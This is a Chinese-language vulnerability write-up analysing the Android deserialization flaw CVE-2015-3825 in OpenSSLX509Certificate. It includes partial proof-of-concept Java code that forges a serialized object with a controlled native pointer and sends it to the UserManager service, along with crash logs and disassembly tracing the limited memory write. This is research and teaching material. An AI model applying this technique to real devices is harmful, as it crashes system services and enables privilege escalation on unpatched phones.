<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">OpenSSLX509Certificate反序列化漏洞（CVE-2015-3825）成因分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">阿里移动安全</a> <span class="bull">·</span> <time title="2015/11/09 11:13" ui-time="" datetime="2015/11/09 11:13" class="published ng-binding ng-isolate-scope">2015/11/09 11:13</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="31d78390d68f8c71d8a98ed8b6bdd6968ad4bb99d49fb8d4b499">[email&#160;protected]</a></strong></p><h1>0x00 序</h1><hr><p>序列化 (Serialization)，是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。使用者可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p><p>Android也有许多场景使用序列化进行数据传递，如App间/内的对象传递、Binder通信的数据传递等等，一般涉及跨进程、跨权限。序列化/反序列也是程序/接口的一个输入，存储区的内容或序列是可被随机填充，如果使用时验证不完整，也会导致安全漏洞。在Android系统中，可通过序列化/反序列化漏洞实现App拒绝服务、提升权限等攻击。</p><h1>0x01 漏洞成因</h1><hr><p>这个Android序列化漏洞(CVE-2015-3825)，影响Android4.3及Android5.1版本，也就是Jelly Bean、KitKat、棒棒糖和Android M预览版1，波及55%的Android设备。可在受影响的设备上提权到system权限，也就意味着攻击者可以通过替换目标应用的apk接管受害者手机上的任意应用。这个漏洞是由的IBM安全团队Or Peles和Roee Hay在USENIX 2015大会上的议题《ONE CLASS TO RULE THEM ALL 0-DAY DESERIALIZATION VULNERABILITIES IN ANDROID》【1】。</p><h2>2.1 PoC构造</h2><p>Paper作者没放出Exploit也没放出PoC，根据这篇paper我们可以知道，漏洞出在OpenSSLX509Certificate（全包名路径为com.android.org.conscrypt.OpenSSLX509Certificate）类，OpenSSLX509Certificate类满足：</p><p>1）OpenSSLX509Certificate是可序列化的，因为他继承自可序列化的Certificate类；<br>2）它有一个finalize()方法，并且有调用native的方法（libjavascrypto.so中），参数field mContext，long型（实际为指针类型）；<br>3）OpenSSLX509Certificate也没有实现特定的反序列化方法（readObject和readResolve）；</p><p>其中mContext就是要找的可被攻击控制的指针。</p><p>我对CVE-2014-7911的POC进行了改造，首先定义类<code>com.android.org.conscrypt.ApenSSLX509Certificate</code>，如下：</p><pre><code>#!java
public class ApenSSLX509Certificate implements Serializable {
    //private static final long serialVersionUID = -5454153458060784251L;//android4.4.2 emulator
    private static final long serialVersionUID = -8550350185014308538L;//android 5.1.1 emulator
    public final long mContext;
    ApenSSLX509Certificate(long ctx) {
        mContext = ctx;
    }
}
</code></pre><p>注意包名为com.android.org.conscrypt，然后在同包名下创建一个MainActivity.java，对ApenSSLX509Certificate进行调用：</p><pre><code>#!java
com.android.org.conscrypt.ApenSSLX509Certificate evilProxy = new com.android.org.conscrypt.ApenSSLX509Certificate(0x7f7f7f7f7f7f7f7fL);
b.putSerializable("eatthis", evilProxy);
</code></pre><p>和CVE-2014-7911 PoC一样，向“android.os.IUserManager”的service发送请求前，修改类名：</p><pre><code>#!java
int l = data.length;
for (int i=0; i&lt;l-4; i++) {
if (data[i] == 'A' &amp;&amp; data[i+1] == 'p' &amp;&amp; data[i+2] == 'e' &amp;&amp; data[i+3] == 'n') {
data[i] = 'O';
break;
    }
}
</code></pre><p>类似CVE-2014-7911的分析，我们也对service.jar加一些日志信息输出，在Android 4.4.2的AVD中，安装、运行PoC，我们看到：</p><pre>E/CVE-2014-7911-trace(1669): setApplicationRestrictions
E/CVE-2014-7911-trace(1669): writeApplicationRestrictionsLocked
E/CVE-2014-7911-trace(1669): writeApplicationRestrictionsLocked::for::eatthis
E/CVE-2014-7911-trace(1669): writeApplicationRestrictionsLocked::for::else
E/CVE-2014-7911-trace(1669): writeApplicationRestrictionsLocked::Exception
E/CVE-2014-7911-trace(1669): writeApplicationRestrictionsLocked::Exception::java.lang.ClassCastException: com.android.org.conscrypt.OpenSSLX509Certificate cannot be cast to java.lang.String[]
W/System.err(1669): java.lang.ClassCastException: com.android.org.conscrypt.OpenSSLX509Certificate cannot be cast to java.lang.String[]
at com.android.server.pm.UserManagerService.writeApplicationRestrictionsLocked(UserManagerService.java:1417)
at com.android.server.pm.UserManagerService.setApplicationRestrictions(UserManagerService.java:1124)
at android.os.IUserManager$Stub.onTransact(IUserManager.java:245)
W/System.err(1669):     at android.os.Binder.execTransact(Binder.java:404)
W/System.err(1669):     at dalvik.system.NativeStart.run(Native Method)
<strong>E/UserManagerService(1669): Error writing application restrictions list</strong>
</pre><p>也是强制类型转换导致异常，与CVE-2014-7911的强制转换为java.io.Serializable导致的异常不同，因为传入的object本身不是序列化的对象，致使类型转换失败。CVE-2015-3825是将<code>com.android.org.conscrypt.OpenSSLX509Certificate</code>强制转换为<code>java.lang.String[]</code>而产生的异常。</p><p>验证PoC过程中，在Android 4.4.2 AVD，只触发了“Error writing application restrictions list”异常，但是GC资源回收没被触发。</p><p>在Android 5.1.1 AVD，可以通过重复发送n次的“TRANSACTION&#95;setApplicationRestrictions”请求可以触发GC回收资源，最后导致system&#95;server的crash:</p><pre><code>A/libc(4839): Fatal signal 11 (SIGSEGV), code 1, fault addr 0x7f7f7f8f in tid 4848 (FinalizerDaemon)
I/DEBUG(61): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG(61): Build fingerprint: 'generic/sdk_phone_armv7/generic:5.1/LKY45/1737576:eng/test-keys'
I/DEBUG(61): Revision: '0'
I/DEBUG(61): ABI: 'arm'
I/DEBUG(61): pid: 4839, tid: 4848, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;
I/DEBUG(61): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x7f7f7f8f
I/DEBUG(61):     r0 00000000  r1 0000000c  r2 00000000  r3 00000000
I/DEBUG(61):     r4 b6c9766f  r5 00000003  r6 ffffffff  r7 7f7f7f8f
I/DEBUG(61):     r8 00000075  r9 b6c24ac9  sl a78fbaa4  fp 13068980
I/DEBUG(61):     ip 00000001  sp a78fba58  lr b6c3da1d  pc b6c3da1c  cpsr 60000030
I/DEBUG(61): backtrace:
I/DEBUG(61):     #00 pc 00072a1c  /system/lib/libcrypto.so (CRYPTO_add_lock+59)
I/DEBUG(61):     #01 pc 000579b1  /system/lib/libcrypto.so (asn1_do_lock+68)
I/DEBUG(61):     #02 pc 0005646f  /system/lib/libcrypto.so
09-06 20:31:31.394: I/DEBUG(61):     #03 pc 00056415  /system/lib/libcrypto.so (ASN1_item_free+12)
09-06 20:31:31.395: I/DEBUG(61):     #04 pc 00017c0d  <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bf90dbdecbde90dbded3c9d6d492dcdedcd7da90decdd290ccc6cccbdad2ffd9cdded2dac8d0cdd4">[email&#160;protected]</a>@boot.oat
09-06 20:32:09.116: I/art(5663): Background sticky concurrent mark sweep GC freed 7340(386KB) AllocSpace objects, 0(0B) LOS objects, 45% free, 603KB/1117KB, paused 887us total 513.880ms
09-06 20:32:22.682: I/DEBUG(61): Tombstone written to: /data/tombstones/tombstone_01
</code></pre><h2>2.2 异常分析</h2><p>这里基于Android 5.1.1 AVD上的分析。</p><p>上面说到，“<code>TRANSACTION_setApplicationRestrictions</code>”请求发出后，导致一个异常，然后GC回收资源。</p><p>从源代码分析，GC调用<code>OpenSSLX509Certificate. finalize()</code>:</p><pre><code>@Override
protected void finalize() throws Throwable {
    try {
        if (mContext != 0) {
            NativeCrypto.X509_free(mContext);
        }
    } finally {
        super.finalize();
    }
}
</code></pre><p>然后调用<code>NativeCrypto.X509_free()</code>方法，该方法在NativeCrypto.java定义如下：</p><pre><code>public static native void X509_free(long x509ctx);
</code></pre><p>最终是在libjavacrypto.so中实现的，该函数定义在org&#95;conscrypt&#95;NativeCrypto.cpp文件中：</p><pre><code>static void NativeCrypto_X509_free(JNIEnv* env, jclass, jlong x509Ref) {
    X509* x509 = reinterpret_cast&lt;X509*&gt;(static_cast&lt;uintptr_t&gt;(x509Ref));
    JNI_TRACE("X509_free(%p)", x509);
    if (x509 == NULL) {
        jniThrowNullPointerException(env, "x509 == null");
        JNI_TRACE("X509_free(%p) =&gt; x509 == null", x509);
        return;
    }
    X509_free(x509);
}
</code></pre><p><code>NativeCrypto_X509_free</code>函数最后调用的X509_free是OpenSSL库提供的接口，关于如何找到该函数实现请参考附录一。</p><p>根据上面分析得到信息，在动态调试时，我们在<code>libjavacrypto.so:: NativeCrypto_X509_free</code>函数中下断，</p><pre>.text:00008C1C sub_8C1C                                ; DATA XREF: .data:000175ACo
.text:00008C1C                 CBNZ            R2, loc_8C26
.text:00008C1E                 LDR             R1, =(aX509Null - 0x8C24)
.text:00008C20                 ADD             R1, PC  ; "x509 == null"
.text:00008C22                 B.W             j_j_j_jniThrowNullPointerException
.text:00008C26
.text:00008C26 loc_8C26                                ; CODE XREF: sub_8C1Cj
.text:00008C26                 MOV             R0, R2
<strong>.text:00008C28                 B.W             j_j_X509_free</strong>
.text:00008C28 ; End of function sub_8C1C
</pre><p>下断点后，有时会碰到单步执行异常，笔者使用的一个办法供参考：设置该lib库的所有内存节属性为可写的。</p><p>在j&#95;j&#95;X509_free中单步步入，到<code>libcrypto.so: ASN1_item_free</code>函数，</p><pre><code>.text:00056408                 EXPORT ASN1_item_free
.text:00056408 ASN1_item_free                          ; CODE XREF: j_ASN1_item_free+8j
.text:00056408                                         ; DATA XREF: .got:ASN1_item_free_ptro
.text:00056408
.text:00056408 var_C           = -0xC
.text:00056408
.text:00056408                 PUSH.W          {R11,LR}
.text:0005640C                 SUB             SP, SP, #8
.text:0005640E                 STR             R0, [SP,#0x10+var_C]
.text:00056410                 ADD             R0, SP, #0x10+var_C
.text:00056412                 MOVS            R2, #0
.text:00056414                 BL              sub_56420 
.text:00056418                 ADD             SP, SP, #8
.text:0005641A                 POP.W           {R11,PC}
.text:0005641A ; End of function ASN1_item_free
</code></pre><p>sub_56420即为<code>asn1_item_combine_free</code>函数，定义为：</p><pre><code>static void asn1_item_combine_free(ASN1_VALUE **pval, const ASN1_ITEM *it, int combine)
</code></pre><p>我们继续分析这个函数，</p><pre><code>.text:00056420 sub_56420                               ; CODE XREF: ASN1_item_free+Cp
.text:00056420                                         ; ASN1_item_ex_free+2j ...
.text:00056420                 PUSH.W          {R4-R10,LR}
.text:00056424                 MOV             R10, R0 ; R0: pval, &amp;mContext;
.text:00056426                 MOV             R8, R2  ; R1: combine, int;
.text:00056428                 MOV             R5, R1  ; R1: it, ASN1_ITEM;
.text:00056428                                         ; libcrypto.so:X509_NAME_TYPE_it
.text:0005642A                 CMP.W           R10, #0 ; if (!pval) return;
.text:0005642E                 BEQ.W           def_5645A ; jumptable 0005645A default case
.text:00056432                 LDRB            R1, [R5] ; R1 &lt;- it-&gt;itype;
.text:00056434                 LDR             R0, [R5,#0x10] ; R0 &lt;- aux = it-&gt;funcs;
.text:00056436                 CBZ             R1, loc_56442 ; #define ASN1_ITYPE_PRIMITIVE 0x0
.text:00056438                 LDR.W           R2, [R10] ; !*pval
.text:0005643C                 CMP             R2, #0
.text:0005643E                 BEQ.W           def_5645A ; jumptable 0005645A default case
</code></pre><p>如分号后的备注所写，这段代码将初始相关变量：将&amp;mContext存入R10，combine存入R2，it存入R5，然后验证参数的合法性。代码继续，获取aux->asn1_cb存入R9中：</p><pre><code>.text:00056442 loc_56442                               ; CODE XREF: sub_56420+16j
.text:00056442                 CMP             R0, #0
.text:00056444                 ITT NE
.text:00056446                 LDRNE.W         R9, [R0,#0x10] ; R9: asn1_cb = aux-&gt;asn1_cb;
.text:0005644A                 CMPNE.W         R9, #0
.text:0005644E                 BNE             loc_56454 ; switch(it-&gt;itype)
.text:00056450                 MOV.W           R9, #0
</code></pre><p>继续，接下来调用asn1&#95;do&#95;lock函数：</p><pre><code>.text:00056466                 MOV             R0, R10 ; jumptable 0005645A cases 1,6
.text:00056468                 MOV.W           R1, #0xFFFFFFFF ; 传入-1
.text:0005646C                 MOV             R2, R5  ; it
.text:0005646E                 BLX             j_asn1_do_lock ; int asn1_do_lock(ASN1_VALUE **pval, int op, const ASN1_ITEM *it)
.text:0005646E                                         ; 走到这了，crash在这个函数
.text:00056472                 CMP             R0, #0  
.text:00056474                 BGT             def_5645A ; jumptable 0005645A default case
</code></pre><p>此时整理asn1&#95;do&#95;lock函数调用时参数：R0是上面R10存储的&amp;mContext，R1为-1，R2为上面R5存储的it。下面进入asn1&#95;do&#95;lock函数继续分析，取出it->funcs放入R2：</p><pre><code>.text:00057984                 LDR             R2, [R2,#0x10] ; aux = it-&gt;funcs;
.text:00057986                 CMP             R2, #0
</code></pre><p>再取it->funcs即aux的ref&#95;offset放入R3中，然后计算(char*)mContext+aux->ref&#95;offset的存入R12：</p><pre><code>.text:00057992                 LDR             R3, [R2,#8] ; aux-&gt;ref_offset
.text:00057994                 CMP             R1, #0
.text:00057996                 LDR             R0, [R0] ; R0 = &amp;mContext
.text:00057998                 ADD.W           R12, R0, R3 ; lck = offset2ptr(*pval, aux-&gt;ref_offset);
.text:0005799C                 BEQ             loc_579B6
</code></pre><p>接下来是调用CRYPTO&#95;add&#95;lock函数：</p><pre><code>.text:000579A2                 MOVS            R0, #0x75
.text:000579A4                 LDR             R3, =(aExternalOpe_43 - 0xFA1D8)
.text:000579A6                 ADD             LR, PC ; _GLOBAL_OFFSET_TABLE_
.text:000579A8                 LDR             R2, [R2,#0xC] ; aux-&gt;ref_lock
.text:000579AA                 ADD             R3, LR  ; "external/openssl/crypto/asn1/tasn_utl.c"
.text:000579AC                 STR             R0, [SP,#0x10+var_10] ; line: 0x75 -&gt; 117
.text:000579AE                 MOV             R0, R12
.text:000579B0                 BLX             j_CRYPTO_add_lock ; int CRYPTO_add_lock(int *pointer, int amount, int type, const char *file, int line)
</code></pre><p>进一步分析CRYPTO&#95;add&#95;lock函数，读取R7地址的内容再加R1（R1＝-1，这里也就是减1操作），然后再存入R1地址中：</p><pre>.text:000729E0 ; int CRYPTO_add_lock(int *pointer, int amount, int type, const char *file, int line)
.text:000729E0                 EXPORT CRYPTO_add_lock
.text:000729E0 CRYPTO_add_lock                         ; CODE XREF: j_CRYPTO_add_lock+8j
.text:000729E4                 MOV             R7, R0  ; R7 = (char*)mContext+aux->ref_offset
... ...
.text:000729E8                 MOV             R6, R1  ; R1 = -1
… …
.text:00072A1C                 LDR             R0, [R7] ; <strong>Crash在这，此时R7为0x7F7F7F8F</strong>
.text:00072A24                 ADD             R6, R0
… …
.text:00072A28                 STR             R6, [R7] ; 如果R7指向的内存为写的，这里可以实现任意写
</pre><p>调试时aux->ref&#95;offset的值为0x10，参考x509&#95;st结构，我们猜测(char*)mContext+0x10为mContext-> references，用记录对象引用次数，管理内存的引用。再看源码tasn&#95;fre.c (external/openssl/crypto/asn1/)【4]的asn1&#95;item&#95;combine&#95;free方法：</p><pre><code>case ASN1_ITYPE_SEQUENCE:
if (asn1_do_lock(pval, -1, it) &gt; 0)
    return;
if (asn1_cb)
    {
    i = asn1_cb(ASN1_OP_FREE_PRE, pval, it, NULL);
    if (i == 2)
        return;
    }
</code></pre><p>当asn1&#95;do&#95;lock返回为0，即mContext-> references为0时，才调用asn1_cb函数释放资源。</p><p>继续CRYPTO&#95;add&#95;lock的反汇编代码分析，由于我们在Java层传入的是一个非法地址0x7f7f7f7f，所以导到内存写异常。</p><p>Google的修复方法【2】是给mContext成员添加transient修饰符，使其不被序列化。</p><h1>0x03 总结</h1><hr><p>在对象序列化时，指针成员的序列化较易存在安全风险，如CVE-2014-7911中的mOrgue，CVE-2015-3825中的mContext。本漏洞（CVE-2015-3825）中由于mContext是可序列化的，而它指向的又是X509结构的指针，当传入的序列化对象在反序列化产生异常时，系统调用GC回收资源，即mContext->references减1，这里mContext是可控制的，便可导致有限制的内存任意写（多次减1）漏洞。</p><h1>0x04 参考</h1><hr><p>【1】 <a href="https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf">https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf</a><br>【2】 <a href="https://android.googlesource.com/platform/external/conscrypt/+/edf7055461e2d7fa18de5196dca80896a56e3540">https://android.googlesource.com/platform/external/conscrypt/+/edf7055461e2d7fa18de5196dca80896a56e3540</a><br>【3】 <a href="https://github.com/Purity-Lollipop/platform_external_conscrypt/commit/edf7055461e2d7fa18de5196dca80896a56e3540">https://github.com/Purity-Lollipop/platform&#95;external&#95;conscrypt/commit/edf7055461e2d7fa18de5196dca80896a56e3540</a><br>【4】 <a href="https://android.googlesource.com/platform/external/openssl/+/android-5.1.1_r13/crypto/asn1/tasn_fre.c">https://android.googlesource.com/platform/external/openssl/+/android-5.1.1&#95;r13/crypto/asn1/tasn&#95;fre.c</a></p><h1>0x05 附录</h1><hr><h2>5.1 如何找到那个叫X509_free的函数</h2><p>在OpenSSL代码中怎么搜X509&#95;free也搜索不到真正的代码实现，这是因为OpenSSL中用了一堆宏、宏嵌套定义部分函数、结构，X509&#95;free就在其中一个。细细看代码才发现X509&#95;free是在crypto/asn1/x&#95;x509.c文件中由IMPLEMENT&#95;ASN1&#95;FUNCTIONS定义的：</p><pre><code>IMPLEMENT_ASN1_FUNCTIONS(X509)
</code></pre><p>顺藤摸瓜找出下面几个嵌套的宏：</p><pre><code># define IMPLEMENT_ASN1_FUNCTIONS_fname(stname, itname, fname) \
        IMPLEMENT_ASN1_ENCODE_FUNCTIONS_fname(stname, itname, fname) \
        IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(stname, itname, fname)    

# define IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(stname, itname, fname) \
        stname *fname##_new(void) \
        { \
                return (stname *)ASN1_item_new(ASN1_ITEM_rptr(itname)); \
        } \
        void fname##_free(stname *a) \
        { \
                ASN1_item_free((ASN1_VALUE *)a, ASN1_ITEM_rptr(itname)); \
        }
    #define ASN1_ITEM_rptr(ref) (&amp;(ref##_it))
</code></pre><p>映射到X509的定义，可以翻译如下：</p><pre><code>X509 * X509_new(void) \
        { \
                return (X509 *)ASN1_item_new(&amp;X509_it); \
        } \
        void X509_free(X509 *a) \
        { \
                ASN1_item_free((ASN1_VALUE *)a, &amp;X509_it)); \
        }
</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/1440" rel="bookmark" id="re1">Android Adobe Reader 任意代码执行分析(附POC)</a></li><li><a href="http://drops.wooyun.org/papers/10896" rel="bookmark" id="re2">CVE-2015-1538漏洞利用中的Shellcode分析</a></li><li><a href="http://drops.wooyun.org/papers/3030" rel="bookmark" id="re3">一只android短信控制马的简单分析</a></li><li><a href="http://drops.wooyun.org/papers/2893" rel="bookmark" id="re4">Intent scheme URL attack</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Budi</span> <span class="reply-time">2016-03-08 16:25:13</span></div><p></p><p>我好好学习一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Moonight</span> <span class="reply-time">2015-11-09 14:07:56</span></div><p></p><p>赞没羽，很精彩的文章，也可以延伸出一系列的攻击方式</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">你你</span> <span class="reply-time">2015-11-09 13:47:20</span></div><p></p><p>这文章含金量高，毕竟中国人嘛</p><p></p></div></div></div></div></div></main>